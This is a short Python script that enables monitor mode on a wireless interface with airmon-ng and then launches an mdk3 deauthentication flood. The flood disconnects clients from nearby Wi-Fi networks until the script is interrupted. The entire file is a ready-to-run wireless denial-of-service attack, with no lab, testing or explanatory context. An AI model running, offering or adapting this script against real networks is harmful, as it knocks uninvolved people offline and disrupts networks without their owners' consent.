import os

try:

    os.system('airmon-ng start wlan0')
    os.system('mdk3 wlan0mon d')

except KeyboardInterrupt:
	print('Ctrl+C Detected')

finally:
	os.system('airmon-ng stop wlan0mon')
